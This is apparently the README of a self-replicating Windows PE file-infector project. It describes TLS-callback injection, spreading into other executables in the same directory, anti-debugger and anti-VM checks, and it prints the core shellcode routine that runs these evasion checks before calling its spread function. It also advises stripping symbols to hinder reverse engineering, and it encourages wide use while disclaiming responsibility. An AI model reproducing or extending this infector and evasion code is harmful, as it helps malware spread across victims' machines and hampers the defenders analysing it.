# PE-infector
A small project that infect itself (malicious payload) to other file and trigger when run
Use it widely, I won't be responsible for any damage cause by this project.
### Build
``make`` to build the project
``make clean`` to clean stuff(object file, .exe file), only keep the source
Final file: ``final.exe``


### What it does
- [x] TLS callback inject
- [x] Inject itself to anther file (in same directory), the infected can also do the same
- [x] Checking debugger (anti debug)
- [x] Checking Virtualization (anti vm, curently only vmware and vbox, add more later)
- [ ] IAT patching
- [x] All shellcode, only .text section required

### Some note
-   About Anti VM: I use cpuid for detection, if you using windows with hyperV enable, you probably gonna get VM detect message even you run it on physical OS. That's because, when hypervisor is enable, the host OS is still gonna run under virtualization (this will explain everything, in the limitation part: [link](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/about/))
Update: I did do some update so that even host OS is working on hypervisor layer, the malware still work, by checking registry ``"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"``, if there is a registry key name: VirtualMachineID or VirtualMachineName -> It should be HyperV (even though this could really easy to counter by adjust , add or remove registry keys)
-   In case you want to test it with no anti-vm, no anti-debug, go to this code in shellcode.c and comment these line:
```c
void shellcode()
{
    #pragma GCC diagnostic ignored "-Wcast-function-type"
    HMODULE kernel32 = getModuleByName(aKernel32dll);
    pGetProcAddress _GetProcAddress = (pGetProcAddress)getFuncByName(kernel32, aGetProcAddress);
    pLoadLibraryA _LoadLibraryA = (pLoadLibraryA)_GetProcAddress(kernel32, aLoadLibraryA);
    HMODULE user32 = _LoadLibraryA(aUser32dll);
    pMessageBoxA _MessageBoxA = (pMessageBoxA)_GetProcAddress(user32, aMessageBoxA);
    #pragma GCC diagnostic pop
    if (isDebuggerPresentBit(kernel32, _GetProcAddress) == TRUE) // <-- comment this section for no anti-debug
    {
        _MessageBoxA(NULL, aDbgDetected, NULL, 0);
        goto EXITDOOR;
    }
    if (detectWithNTQuery(kernel32, _GetProcAddress, _LoadLibraryA)) // <-- comment this section for no anti-debug
    {
        _MessageBoxA(NULL, aDbgDetected, NULL, 0);
        goto EXITDOOR;
    }
    if (detectCPUID_ManufactureID(kernel32, _GetProcAddress, _LoadLibraryA)) // <-- comment this section for no anti-vm
    {
        if (detectRegKey(kernel32, _GetProcAddress, _LoadLibraryA))
        {
            _MessageBoxA(NULL, aVMDetected, NULL,0);
            goto EXITDOOR;
        }
    }
    if (detectCPUID_HypervisorBit()) // <-- comment this section for no anti-vm
    {
        if (detectRegKey(kernel32, _GetProcAddress, _LoadLibraryA))
        {
            _MessageBoxA(NULL, aVMDetected, NULL,0);
            goto EXITDOOR;
        }
        
    }
    spread(kernel32, _GetProcAddress, _LoadLibraryA);
    _MessageBoxA(NULL, aMSSV, NULL, 0); 
    EXITDOOR:
    return;
}
```
-   Currently I dont have time to implement some method such as: checking registry (for detect VM), capture process list and check for debugger, ... That will be story of another time.
-   There is no harm in the original code, but I still warn you to compile it instead of using my PE.
-   If you want to make the reverse task more challenging, you should add -s and -O3 flag to the last line( the ``gcc start.o decryptor.o shellcode.o -o final.o -m64 ...``) to strip all symbol and optimize code
